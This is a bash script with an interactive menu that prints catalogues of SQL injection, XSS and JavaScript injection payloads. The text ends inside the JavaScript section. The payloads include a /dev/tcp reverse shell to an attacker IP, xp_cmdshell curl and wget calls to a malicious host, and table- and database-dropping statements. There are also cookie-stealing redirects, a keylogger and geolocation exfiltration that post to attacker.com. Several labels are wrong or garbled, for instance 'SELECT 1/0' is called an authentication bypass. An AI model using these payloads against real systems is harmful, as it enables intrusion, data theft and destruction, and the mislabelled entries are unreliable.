#!/bin/bash

# Function to display payload and description with colors
display_payload() {
    payload="$1"
    description="$2"
    
    # Displaying payload with colors
    echo -e "\e[34mPayload:\e[0m"
    echo -e "\e[36m$payload\e[0m"
    echo -e "\e[34mDescription:\e[0m \e[37m$description\e[0m"
    
# Change text color to green
echo -e "\e[32mPress Enter to continue\e[0m"
# Wait for the user to press Enter
read
echo ""
}

# Function for each payload category

# SQL Injection Payloads
sql_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Classic SQL Injection (OR condition)\e[0m"
        echo -e "\e[33m2) Error-based SQL Injection (Union Select)\e[0m"
        echo -e "\e[33m3) Union-based SQL Injection (Column-based)\e[0m"
        echo -e "\e[33m4) Blind SQL Injection (Boolean-based)\e[0m"
        echo -e "\e[33m5) Blind SQL Injection (Time-based)\e[0m"
        echo -e "\e[33m6) Second-order SQL Injection\e[0m"
        echo -e "\e[33m7) Out-of-Band SQL Injection (Load File)\e[0m"
        echo -e "\e[33m8) SQL Injection (Subselect Injection)\e[0m"
        echo -e "\e[33m9) Stacked Queries SQL Injection (Multiple Queries)\e[0m"
        echo -e "\e[33m10) Error-based SQL Injection with Delay\e[0m"
        echo -e "\e[33m11) Time-based Blind with Random Delay\e[0m"
        echo -e "\e[33m12) SQL Injection with DNS Exfiltration\e[0m"
        echo -e "\e[33m13) SQL Injection with Email Exfiltration\e[0m"
        echo -e "\e[33m14) SQL Injection with OS Command Execution (Windows)\e[0m"
        echo -e "\e[33m15) SQL Injection with OS Command Execution (Linux)\e[0m"
        echo -e "\e[33m16) SQL Injection with XML External Entity (XXE)\e[0m"
        echo -e "\e[33m17) SQL Injection with XPath Injection\e[0m"
        echo -e "\e[33m18) SQL Injection with HTTP Response Splitting\e[0m"
        echo -e "\e[33m19) SQL Injection with File Inclusion (Local)\e[0m"
        echo -e "\e[33m20) SQL Injection with File Inclusion (Remote)\e[0m"
        echo -e "\e[33m21) SQL Injection with JSON Data Exploitation\e[0m"
        echo -e "\e[33m22) SQL Injection with Subquery Filtering\e[0m"
        echo -e "\e[33m23) SQL Injection with Recursive Queries\e[0m"
        echo -e "\e[33m24) SQL Injection for Database Fingerprinting\e[0m"
        echo -e "\e[33m25) SQL Injection with Encrypted Data Extraction\e[0m"
        echo -e "\e[33m26) Time-based Blind with Different Conditions\e[0m"
        echo -e "\e[33m27) Error-based SQL Injection with File Exfiltration\e[0m"
        echo -e "\e[33m28) SQL Injection with HTTP Command Execution\e[0m"
        echo -e "\e[33m29) SQL Injection with Cookie Manipulation\e[0m"
        echo -e "\e[33m30) SQL Injection for Password Cracking\e[0m"
        echo -e "\e[33m31) SQL Injection for Database Schema Dump\e[0m"
        echo -e "\e[33m32) SQL Injection for Dumping Tables\e[0m"
        echo -e "\e[33m33) SQL Injection for Dumping Columns\e[0m"
        echo -e "\e[33m34) SQL Injection with File Upload Bypass\e[0m"
        echo -e "\e[33m35) SQL Injection with Cross-Site Scripting\e[0m"
        echo -e "\e[33m36) SQL Injection with Blind Cross-Site Request Forgery\e[0m"
        echo -e "\e[33m37) SQL Injection with Sensitive Data Extraction\e[0m"
        echo -e "\e[33m38) SQL Injection for Creating Admin Accounts\e[0m"
        echo -e "\e[33m39) SQL Injection with Database Backdoor\e[0m"
        echo -e "\e[33m40) SQL Injection with OS Command Execution\e[0m"
        echo -e "\e[33m41) SQL Injection for Trigger-based Exploits\e[0m"
        echo -e "\e[33m42) SQL Injection with XML File Exfiltration\e[0m"
        echo -e "\e[33m43) SQL Injection with Session Fixation\e[0m"
        echo -e "\e[33m44) SQL Injection with Recursive Function Exploitation\e[0m"
        echo -e "\e[33m45) SQL Injection for Blind Data Extraction\e[0m"
        echo -e "\e[33m46) SQL Injection for Accessing Protected Pages\e[0m"
        echo -e "\e[33m47) SQL Injection for Data Modification (INSERT)\e[0m"
        echo -e "\e[33m48) SQL Injection for Data Modification (UPDATE)\e[0m"
        echo -e "\e[33m49) SQL Injection for Data Deletion (DELETE)\e[0m"
        echo -e "\e[33m50) SQL Injection for Password Hash Extraction\e[0m"
        echo -e "\e[33m51) SQL Injection for Authentication Bypass\e[0m"
        echo -e "\e[33m52) SQL Injection with Timestamp Injection\e[0m"
        echo -e "\e[33m53) SQL Injection for Non-Existent Data Exploitation\e[0m"
        echo -e "\e[33m54) SQL Injection for Exploiting Date Fields\e[0m"
        echo -e "\e[33m55) Return to Main Menu\e[0m"

        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "' OR 1=1--" "Classic SQL Injection (OR condition)";;
            2) display_payload "' AND 1=1 GROUP BY column_name HAVING 1=1--" "Error-based SQL Injection (Union Select)";;
            3) display_payload "' UNION SELECT username, password FROM users--" "Union-based SQL Injection (Column-based)";;
            4) display_payload "' AND '1'='1" "Blind SQL Injection (Boolean-based)";;
            5) display_payload "' OR IF(1=1,SLEEP(5),0)--" "Blind SQL Injection (Time-based)";;
            6) display_payload "' OR EXISTS(SELECT * FROM users WHERE username='admin')--" "Second-order SQL Injection";;
            7) display_payload "' UNION SELECT 1, LOAD_FILE('/etc/passwd')--" "Out-of-Band SQL Injection (Load File)";;
            8) display_payload "' AND (SELECT COUNT(*) FROM users) > 0 --" "SQL Injection (Subselect Injection)";;
            9) display_payload "'; DROP TABLE users;--" "Stacked Queries SQL Injection (Multiple Queries)";;
            10) display_payload "' AND 1=1 AND SLEEP(5)--" "Error-based SQL Injection with Delay";;
            11) display_payload "' OR IF(1=1,SLEEP(RAND() % 10),0)--" "Time-based Blind with Random Delay";;
            12) display_payload "'; EXEC xp_cmdshell('nslookup example.com')--" "SQL Injection with DNS Exfiltration";;
            13) display_payload "'; EXEC xp_cmdshell('echo user@example.com > /tmp/emails.txt')--" "SQL Injection with Email Exfiltration";;
            14) display_payload "'; EXEC xp_cmdshell('whoami')--" "SQL Injection with OS Command Execution (Windows)";;
            15) display_payload "'; /bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1 --" "SQL Injection with OS Command Execution (Linux)";;
            16) display_payload "'; DROP XML DATASET --" "SQL Injection with XML External Entity (XXE)";;
            17) display_payload "'; /* XPath Injection: XPath query bypass */ /bookstore/book/title[text()='admin'] --" "SQL Injection with XPath Injection";;
            18) display_payload "'; HTTP/1.1 302 Found Location: http://attacker.com --" "SQL Injection with HTTP Response Splitting";;
            19) display_payload "' UNION SELECT 1, LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts')--" "SQL Injection with File Inclusion (Local)";;
            20) display_payload "' UNION SELECT 1, LOAD_FILE('http://malicious.com/shell.txt')--" "SQL Injection with File Inclusion (Remote)";;
            21) display_payload "' UNION SELECT 1, JSON_EXTRACT(data, '$.email') FROM users--" "SQL Injection with JSON Data Exploitation";;
            22) display_payload "' AND (SELECT COUNT(*) FROM users WHERE username='admin') > 0 --" "SQL Injection with Subquery Filtering";;
            23) display_payload "'; WITH RECURSIVE r AS (SELECT * FROM users) SELECT * FROM r; --" "SQL Injection with Recursive Queries";;
            24) display_payload "'; SELECT database() --" "SQL Injection for Database Fingerprinting";;
            25) display_payload "'; SELECT AES_DECRYPT(encrypted_data, 'key') FROM sensitive_data --" "SQL Injection with Encrypted Data Extraction";;
            26) display_payload "' OR IF(1=1,SLEEP(10),0)--" "Time-based Blind with Different Conditions";;
            27) display_payload "'; EXEC xp_cmdshell('curl http://malicious.com/exfiltrate_file')--" "Error-based SQL Injection with File Exfiltration";;
            28) display_payload "'; EXEC xp_cmdshell('wget http://malicious.com/shell')--" "SQL Injection with HTTP Command Execution";;
            29) display_payload "'; SELECT GET_LOCK('session',10)--" "SQL Injection with Cookie Manipulation";;
            30) display_payload "' UNION SELECT password FROM users WHERE username='admin'--" "SQL Injection for Password Cracking";;
            31) display_payload "' UNION SELECT table_name FROM information_schema.tables--" "SQL Injection for Database Schema Dump";;
            32) display_payload "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--" "SQL Injection for Dumping Tables";;
            33) display_payload "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--" "SQL Injection for Dumping Columns";;
            34) display_payload "' UNION SELECT file_name FROM files WHERE file_path='/uploads/'--" "SQL Injection with File Upload Bypass";;
            35) display_payload "'; DROP DATABASE test;--" "SQL Injection with Cross-Site Scripting (XSS) Combined";;
            36) display_payload "'; SELECT session_id FROM sessions WHERE user_id=1--" "SQL Injection with Blind Cross-Site Request Forgery (CSRF)";;
            37) display_payload "'; SELECT * FROM sensitive_data--" "SQL Injection with Sensitive Data Extraction";;
            38) display_payload "'; INSERT INTO users (username, password) VALUES ('admin', 'admin_pass')--" "SQL Injection for Creating Admin Accounts";;
            39) display_payload "'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--" "SQL Injection with Database Backdoor";;
            40) display_payload "'; EXEC xp_cmdshell('whoami')--" "SQL Injection with OS Command Execution (via stored procedure)";;
            41) display_payload "'; CREATE TRIGGER test_trigger BEFORE INSERT ON users FOR EACH ROW INSERT INTO log (action) VALUES ('user_inserted')--" "SQL Injection for Trigger-based Exploits";;
            42) display_payload "' UNION SELECT XMLDATA FROM users--" "SQL Injection with XML File Exfiltration";;
            43) display_payload "'; UPDATE sessions SET session_id='newsessionid' WHERE user_id=1--" "SQL Injection with Session Fixation";;
            44) display_payload "'; WITH RECURSIVE r AS (SELECT * FROM users) SELECT * FROM r WHERE username='admin' --" "SQL Injection with Recursive Function Exploitation";;
            45) display_payload "'; SELECT * FROM users WHERE username='admin' AND password='password' --" "SQL Injection for Blind Data Extraction";;
            46) display_payload "'; UPDATE users SET password='newpass' WHERE username='admin' --" "SQL Injection for Accessing Protected Pages";;
            47) display_payload "'; INSERT INTO users (username, password) VALUES ('newuser', 'newpassword') --" "SQL Injection for Data Modification (INSERT)";;
            48) display_payload "'; UPDATE users SET password='newpass' WHERE username='admin' --" "SQL Injection for Data Modification (UPDATE)";;
            49) display_payload "'; DELETE FROM users WHERE username='attacker' --" "SQL Injection for Data Deletion (DELETE)";;
            50) display_payload "'; SELECT password_hash FROM users WHERE username='admin' --" "SQL Injection for Password Hash Extraction";;
            51) display_payload "'; SELECT 1/0--" "SQL Injection for Authentication Bypass";;
            52) display_payload "'; SELECT NOW()--" "SQL Injection with Timestamp Injection";;
            53) display_payload "'; SELECT COUNT(*) FROM users WHERE username='admin' --" "SQL Injection for Non-Existent Data Exploitation";;
            54) display_payload "'; SELECT * FROM users WHERE last_login='2025-01-28' --" "SQL Injection for Exploiting Date Fields";;
            55) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# XSS Payloads
xss_payloads() {
    while true; do
        echo -e "\e[33m1) Basic JavaScript Injection\e[0m"
        echo -e "\e[33m2) HTML Tag Injection\e[0m"
        echo -e "\e[33m3) Event Handler Injection\e[0m"
        echo -e "\e[33m4) Polyglot Payloads\e[0m"
        echo -e "\e[33m5) DOM-based XSS (DOM Manipulation)\e[0m"
        echo -e "\e[33m6) URL-based XSS (JavaScript URL)\e[0m"
        echo -e "\e[33m7) Self XSS (Injected into browser console)\e[0m"
        echo -e "\e[33m8) SVG-based XSS (Scalable Vector Graphics)\e[0m"
        echo -e "\e[33m9) Base64 Encoded XSS\e[0m"
        echo -e "\e[33m10) XMLHttpRequest XSS (AJAX-based)\e[0m"
        echo -e "\e[33m11) JavaScript URL Injection (Location)\e[0m"
        echo -e "\e[33m12) WebSocket XSS (WebSocket-based)\e[0m"
        echo -e "\e[33m13) Cookie-based XSS (Steal Cookies)\e[0m"
        echo -e "\e[33m14) Reflected XSS (GET parameter exploitation)\e[0m"
        echo -e "\e[33m15) DOM Clobbering (XSS by manipulating DOM)\e[0m"
        echo -e "\e[33m16) HTTP Response Splitting (XSS-based)\e[0m"
        echo -e "\e[33m17) Blind XSS (Injected in user profile, etc.)\e[0m"
        echo -e "\e[33m18) XSS in AngularJS Contexts\e[0m"
        echo -e "\e[33m19) XSS in ReactJS Properties\e[0m"
        echo -e "\e[33m20) XSS in JSON Responses\e[0m"
        echo -e "\e[33m21) XSS with CSS Injection\e[0m"
        echo -e "\e[33m22) XSS in Template Injection (Server-side)\e[0m"
        echo -e "\e[33m23) XSS via Flash (SWF Injection)\e[0m"
        echo -e "\e[33m24) XSS in XMLHttpRequest (AJAX request manipulation)\e[0m"
        echo -e "\e[33m25) DOM XSS via Content Security Policy (CSP) bypass\e[0m"
        echo -e "\e[33m26) XSS through Web Workers\e[0m"
        echo -e "\e[33m27) XSS with Web Assembly\e[0m"
        echo -e "\e[33m28) Cross-Site Script Inclusion (XSSI) Injection\e[0m"
        echo -e "\e[33m29) XSS with JavaScript Libraries (e.g., jQuery, etc.)\e[0m"
        echo -e "\e[33m30) XSS in iFrame (Injected via iframe)\e[0m"
        echo -e "\e[33m31) XSS in WebSockets (Attacking WebSocket connections)\e[0m"
        echo -e "\e[33m32) XSS in POST Data (HTTP POST Injection)\e[0m"
        echo -e "\e[33m33) XSS in Query Parameters (GET-based)\e[0m"
        echo -e "\e[33m34) XSS via File Uploads (malicious file uploads)\e[0m"
        echo -e "\e[33m35) XSS via Referrer Headers (Header Injection)\e[0m"
        echo -e "\e[33m36) XSS via Cache Poisoning\e[0m"
        echo -e "\e[33m37) XSS in JSONP (Cross-Domain Script Inclusion)\e[0m"
        echo -e "\e[33m38) XSS in WebAssembly (WASM-based)\e[0m"
        echo -e "\e[33m39) XSS in AngularJS Expressions\e[0m"
        echo -e "\e[33m40) XSS via HTTP Headers (including cookies)\e[0m"
        echo -e "\e[33m41) XSS in Session Storage\e[0m"
        echo -e "\e[33m42) XSS via SVG Injection (Injecting SVG elements)\e[0m"
        echo -e "\e[33m43) XSS through HTTP Request Smuggling\e[0m"
        echo -e "\e[33m44) XSS in JSON Web Tokens (JWT)\e[0m"
        echo -e "\e[33m45) XSS in Web Components (Shadow DOM exploitation)\e[0m"
        echo -e "\e[33m46) XSS with Scriptless Exploits (No JS payload)\e[0m"
        echo -e "\e[33m47) XSS via URL Fragment Injection\e[0m"
        echo -e "\e[33m48) XSS in Cookies (Injecting script into cookies)\e[0m"
        echo -e "\e[33m49) XSS via HTTP Redirects (Redirect-based)\e[0m"
        echo -e "\e[33m50) XSS in Browser Extensions\e[0m"
        echo -e "\e[33m51) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>alert('XSS')</script>" "Basic JavaScript Injection";;
            2) display_payload "<img src='x' onerror='alert(\"XSS\")'>" "HTML Tag Injection";;
            3) display_payload "<input type='button' value='Click Me' onclick='alert(\"XSS\")'>" "Event Handler Injection";;
            4) display_payload "\"><script>alert('XSS')</script>" "Polyglot Payloads";;
            5) display_payload "<script>document.getElementById('id').innerHTML='Hacked!';</script>" "DOM-based XSS (DOM Manipulation)";;
            6) display_payload "javascript:alert('XSS')" "URL-based XSS (JavaScript URL)";;
            7) display_payload "<script>console.log('XSS: Injected via console')</script>" "Self XSS (Injected into browser console)";;
            8) display_payload "<svg/onload=alert('XSS via SVG')>" "SVG-based XSS (Scalable Vector Graphics)";;
            9) display_payload "<script>eval(atob('YWxlcnQoIkhha2VkISIp'))</script>" "Base64 Encoded XSS";;
            10) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/malicious', true); xhr.send();</script>" "XMLHttpRequest XSS (AJAX-based)";;
            11) display_payload "<a href='javascript:alert(\"XSS\")'>Click me</a>" "JavaScript URL Injection (Location)";;
            12) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onmessage = function(event) { alert('XSS: ' + event.data); }</script>" "WebSocket XSS (WebSocket-based)";;
            13) display_payload "<script>document.cookie='user=attacker'; alert(document.cookie)</script>" "Cookie-based XSS (Steal Cookies)";;
            14) display_payload "<script>window.location='http://attacker.com?param=' + document.cookie;</script>" "Reflected XSS (GET parameter exploitation)";;
            15) display_payload "<script>var el = document.createElement('input'); el.setAttribute('value', 'XSS'); document.body.appendChild(el);</script>" "DOM Clobbering (XSS by manipulating DOM)";;
            16) display_payload "<script>document.write('<img src=\"http://attacker.com/malicious?cookie=' + document.cookie + '\" />');</script>" "HTTP Response Splitting (XSS-based)";;
            17) display_payload "<script>setTimeout(() => { alert('XSS from user profile!'); }, 1000);</script>" "Blind XSS (Injected in user profile, etc.)";;
            18) display_payload "<script>alert('XSS in AngularJS')</script>" "XSS in AngularJS Contexts";;
            19) display_payload "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />" "XSS in ReactJS Properties";;
            20) display_payload "<script>fetch('http://attacker.com').then(res => res.json()).then(json => alert(json.data));</script>" "XSS in JSON Responses";;
            21) display_payload "<style>body { background-image: url('javascript:alert(\"XSS\")'); }</style>" "XSS with CSS Injection";;
            22) display_payload "{{ '<script>alert(\"XSS\")</script>' }}" "XSS in Template Injection (Server-side)";;
            23) display_payload "<object data='x' type='application/x-shockwave-flash'><param name='movie' value='x'></object>" "XSS via Flash (SWF Injection)";;
            24) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com/malicious', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ payload: 'XSS' }));</script>" "XSS in XMLHttpRequest (AJAX request manipulation)";;
            25) display_payload "<script>document.getElementById('target').innerHTML='<img src=\"/path/to/malicious/script.js\" />';</script>" "DOM XSS via Content Security Policy (CSP) bypass";;
            26) display_payload "<script>var worker = new Worker('http://attacker.com/malicious.js'); worker.postMessage('XSS');</script>" "XSS through Web Workers";;
            27) display_payload "<script>eval(WebAssembly.instantiate(new Uint8Array([0x))))</script>" "XSS with Web Assembly";;
            28) display_payload "<script>eval('@import url(\"http://attacker.com/malicious\");');</script>" "Cross-Site Script Inclusion (XSSI) Injection";;
            29) display_payload "<script>alert('XSS with jQuery');</script>" "XSS with JavaScript Libraries (e.g., jQuery, etc.)";;
            30) display_payload "<iframe src='http://attacker.com/malicious'></iframe>" "XSS in iFrame (Injected via iframe)";;
            31) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.send('XSS Attack');</script>" "XSS in WebSockets (Attacking WebSocket connections)";;
            32) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', '/login', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ login: 'xss' }));</script>" "XSS in POST Data";;
            33) display_payload "<script>window.location='http://attacker.com?' + document.cookie;</script>" "XSS in Query Parameters";;
            34) display_payload "<input type='file' oninput='alert(document.cookie)'>" "XSS via File Uploads";;
            35) display_payload "<script>document.write('<script src=\"http://attacker.com/xss.js\"></script>');</script>" "XSS via Referrer Headers";;
            36) display_payload "<script>document.location='http://attacker.com/malicious' + document.cookie;</script>" "XSS via Cache Poisoning";;
            37) display_payload "<script>eval('jsonp'+document.cookie);</script>" "XSS in JSONP";;
            38) display_payload "<script>alert('XSS in WASM');</script>" "XSS in WebAssembly";;
            39) display_payload "<script>alert('XSS in AngularJS Expressions')</script>" "XSS in AngularJS Expressions";;
            40) display_payload "<script>document.cookie = 'token=malicious';</script>" "XSS via HTTP Headers";;
            41) display_payload "<script>localStorage.setItem('user', 'malicious');</script>" "XSS in Session Storage";;
            42) display_payload "<svg/onload=alert('SVG XSS')>" "XSS via SVG Injection";;
            43) display_payload "<script>eval('http://attacker.com/xss');</script>" "XSS through HTTP Request Smuggling";;
            44) display_payload "<script>var token = 'malicious_token'; alert(token);</script>" "XSS in JSON Web Tokens (JWT)";;
            45) display_payload "<script>document.querySelector('shadow-root').innerHTML = '<div><script>alert(1)</script></div>';</script>" "XSS in Web Components";;
            46) display_payload "<script>alert('Scriptless XSS');</script>" "XSS with Scriptless Exploits";;
            47) display_payload "<script>location.hash = '#xss';</script>" "XSS via URL Fragment Injection";;
            48) display_payload "<script>document.cookie = 'xss=true'; alert(document.cookie);</script>" "XSS in Cookies";;
            49) display_payload "<script>window.location = 'http://attacker.com/redirect?' + document.cookie;</script>" "XSS via HTTP Redirects";;
            50) display_payload "<script>chrome.extension.sendMessage({text: 'XSS Attack'});</script>" "XSS in Browser Extensions";;
            51) return;;
            *) echo -e "\e[31mInvalid choice! Please try again.\e[0m";;
        esac
    done
}

# JavaScript Injection Payloads
javascript_injection_payloads() {
    while true; do
        echo -e "\e[33m1) Basic JavaScript Injection\e[0m"
        echo -e "\e[33m2) Window.location Injection\e[0m"
        echo -e "\e[33m3) Document.write Injection\e[0m"
        echo -e "\e[33m4) Eval Injection\e[0m"
        echo -e "\e[33m5) Instant Redirect using window.location\e[0m"
        echo -e "\e[33m6) Instant Redirect using setTimeout (No Delay)\e[0m"
        echo -e "\e[33m7) Redirect with alert before redirecting instantly\e[0m"
        echo -e "\e[33m8) Instant Redirect using meta tag\e[0m"
        echo -e "\e[33m9) Steal Cookies with JavaScript Injection\e[0m"
        echo -e "\e[33m10) JavaScript Keylogger Injection\e[0m"
        echo -e "\e[33m11) DOM Manipulation Injection\e[0m"
        echo -e "\e[33m12) Cross-Site WebSocket Injection\e[0m"
        echo -e "\e[33m13) Cross-Site XMLHttpRequest Injection\e[0m"
        echo -e "\e[33m14) Geolocation Spoofing with JavaScript\e[0m"
        echo -e "\e[33m15) Cookie Stealing via GET Request\e[0m"
        echo -e "\e[33m16) Redirect via IFrame Injection\e[0m"
        echo -e "\e[33m17) XMLHttpRequest with CORS Bypass\e[0m"
        echo -e "\e[33m18) Trigger JavaScript via Malicious Event Listeners\e[0m"
        echo -e "\e[33m19) DOM-based XSS (DOM Manipulation)\e[0m"
        echo -e "\e[33m20) Self-XSS (Injected via Developer Console)\e[0m"
        echo -e "\e[33m21) JavaScript URL Injection\e[0m"
        echo -e "\e[33m22) JavaScript in Inline Event Handlers\e[0m"
        echo -e "\e[33m23) JavaScript in Template Injection\e[0m"
        echo -e "\e[33m24) Cross-Site Script Inclusion (XSSI)\e[0m"
        echo -e "\e[33m25) Content Security Policy (CSP) Bypass\e[0m"
        echo -e "\e[33m26) Cross-Domain XMLHttpRequest (CORS Attack)\e[0m"
        echo -e "\e[33m27) XMLHttpRequest Injection in JSON Response\e[0m"
        echo -e "\e[33m28) Prototype Pollution in JavaScript Objects\e[0m"
        echo -e "\e[33m29) JSONP Injection\e[0m"
        echo -e "\e[33m30) WebSocket Injection\e[0m"
        echo -e "\e[33m31) JavaScript in SVG Tags\e[0m"
        echo -e "\e[33m32) Cross-Origin WebSocket Hijacking\e[0m"
        echo -e "\e[33m33) JavaScript in iframe srcdoc Attribute\e[0m"
        echo -e "\e[33m34) Cross-Site Cookie Theft with JavaScript\e[0m"
        echo -e "\e[33m35) LocalStorage/SessionStorage XSS\e[0m"
        echo -e "\e[33m36) JavaScript with URL Fragments\e[0m"
        echo -e "\e[33m37) Cross-Site JSON Injection\e[0m"
        echo -e "\e[33m38) Malicious Form Submission via JavaScript\e[0m"
        echo -e "\e[33m39) JavaScript Hijacking with POST Requests\e[0m"
        echo -e "\e[33m40) Remote Code Execution via JavaScript Injection\e[0m"
        echo -e "\e[33m41) Client-Side SQL Injection via JavaScript\e[0m"
        echo -e "\e[33m42) Triggering WebSocket Connections for XSS\e[0m"
        echo -e "\e[33m43) Stealthy Script Injection via JavaScript URL\e[0m"
        echo -e "\e[33m44) Browser Hijacking via JavaScript Injection\e[0m"
        echo -e "\e[33m45) DOM Event Hijacking\e[0m"
        echo -e "\e[33m46) Cross-Site Redirect Injection using JavaScript\e[0m"
        echo -e "\e[33m47) Redirect Injection with XMLHttpRequest and POST\e[0m"
        echo -e "\e[33m48) Spoofing POST Requests via JavaScript Injection\e[0m"
        echo -e "\e[33m49) Cross-Site Request Forgery (CSRF) using JavaScript\e[0m"
        echo -e "\e[33m50) Bypass Web Application Firewalls\e[0m"
        echo -e "\e[33m51) Return to Main Menu\e[0m"
        read -p "Select the payload number: " payload_choice
        case $payload_choice in
            1) display_payload "<script>alert('XSS')</script>" "Basic JavaScript Injection";;
            2) display_payload "<script>window.location='http://attacker.com';</script>" "Window.location Injection";;
            3) display_payload "<script>document.write('<h1>Hacked</h1>');</script>" "Document.write Injection";;
            4) display_payload "<script>eval('alert(1)');</script>" "Eval Injection";;
            5) display_payload "<script>window.location='http://attacker.com';</script>" "Instant Redirect using window.location";;
            6) display_payload "<script>setTimeout(function(){ window.location.href='http://attacker.com'; }, 0);</script>" "Instant Redirect using setTimeout (No Delay)";;
            7) display_payload "<script>setTimeout(function(){ alert('Redirecting to attacker site'); window.location='http://attacker.com'; }, 0);</script>" "Redirect with alert before redirecting instantly";;
            8) display_payload "<meta http-equiv='refresh' content='0;url=http://attacker.com'>" "Instant Redirect using meta tag";;
            9) display_payload "<script>document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>" "Steal Cookies with JavaScript Injection";;
            10) display_payload "<script>document.onkeydown = function(e) { var key = e.key; var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com/keylogger', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('key=' + key); }</script>" "JavaScript Keylogger Injection";;
            11) display_payload "<script>document.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;background-color:red;color:white;text-align:center;\">Hacked!</div>';</script>" "DOM Manipulation Injection";;
            12) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onmessage = function(event) { alert('XSS: ' + event.data); }</script>" "Cross-Site WebSocket Injection";;
            13) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/malicious', true); xhr.send();</script>" "Cross-Site XMLHttpRequest Injection";;
            14) display_payload "<script>navigator.geolocation.getCurrentPosition(function(position) { var lat = position.coords.latitude; var lon = position.coords.longitude; var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com/geolocation', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('lat=' + lat + '&lon=' + lon); });</script>" "Geolocation Spoofing with JavaScript";;
            15) display_payload "<script>document.location='http://attacker.com?cookie=' + document.cookie;</script>" "Cookie Stealing via GET Request";;
            16) display_payload "<iframe src='http://attacker.com'></iframe>" "Redirect via IFrame Injection";;
            17) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com', true); xhr.withCredentials = true; xhr.send();</script>" "XMLHttpRequest with CORS Bypass";;
            18) display_payload "<script>document.getElementById('input').addEventListener('click', function(){ alert('XSS triggered via event listener'); });</script>" "Trigger JavaScript via Malicious Event Listeners";;
            19) display_payload "<script>document.body.innerHTML = '<div style=\"position:fixed;top:0;left:0;width:100%;background-color:red;color:white;text-align:center;\">DOM-based XSS</div>';</script>" "DOM-based XSS (DOM Manipulation)";;
            20) display_payload "<script>document.getElementById('input').addEventListener('click', function(){ alert('Self-XSS injected via console'); });</script>" "Self-XSS (Injected via Developer Console)";;
            21) display_payload "<a href='javascript:alert(1)'>Click me</a>" "JavaScript URL Injection";;
            22) display_payload "<button onclick='alert(1)'>Click me</button>" "JavaScript in Inline Event Handlers";;
            23) display_payload "<script>{{ malcode }}</script>" "JavaScript in Template Injection";;
            24) display_payload "<script>document.write('<iframe src=\"http://attacker.com\"></iframe>');</script>" "Cross-Site Script Inclusion (XSSI)";;
            25) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com', true); xhr.setRequestHeader('Content-Security-Policy', 'script-src http://attacker.com'); xhr.send();</script>" "Content Security Policy (CSP) Bypass";;
            26) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com', true); xhr.withCredentials = true; xhr.send();</script>" "Cross-Domain XMLHttpRequest (CORS Attack)";;
            27) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({ data: document.cookie }));</script>" "XMLHttpRequest Injection in JSON Response";;
            28) display_payload "<script>Object.prototype.pollute = function(){alert('Prototype Pollution');}; var obj = {}; obj.pollute();</script>" "Prototype Pollution in JavaScript Objects";;
            29) display_payload "<script>var script = document.createElement('script'); script.src = 'http://attacker.com/malicious.js'; document.head.appendChild(script);</script>" "JSONP Injection";;
            30) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onopen = function() { ws.send(document.cookie); }</script>" "WebSocket Injection";;
            31) display_payload "<script><svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'></svg></script>" "JavaScript in SVG Tags";;
            32) display_payload "<script>var ws = new WebSocket('ws://attacker.com/socket'); ws.onmessage = function(event) { alert('Cross-Origin WebSocket Hijacking: ' + event.data); }</script>" "Cross-Origin WebSocket Hijacking";;
            33) display_payload "<iframe srcdoc='<script>alert(1)</script>'></iframe>" "JavaScript in iframe srcdoc Attribute";;
            34) display_payload "<script>document.cookie = 'sessionid=attacker';</script>" "Cross-Site Cookie Theft with JavaScript";;
            35) display_payload "<script>localStorage.setItem('user', 'attacker');</script>" "LocalStorage/SessionStorage XSS";;
            36) display_payload "<script>window.location.hash = 'attacker'; alert(window.location.hash);</script>" "JavaScript with URL Fragments";;
            37) display_payload "<script>fetch('http://attacker.com/json?cookie=' + document.cookie);</script>" "Cross-Site JSON Injection";;
            38) display_payload "<script>var form = document.createElement('form'); form.action = 'http://attacker.com'; form.method = 'POST'; var input = document.createElement('input'); input.type = 'hidden'; input.name = 'cookie'; input.value = document.cookie; form.appendChild(input); document.body.appendChild(form); form.submit();</script>" "Malicious Form Submission via JavaScript";;
            39) display_payload "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', 'http://attacker.com', true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('cookie=' + document.cookie);</script>" "JavaScript Hijacking with POST Requests";;
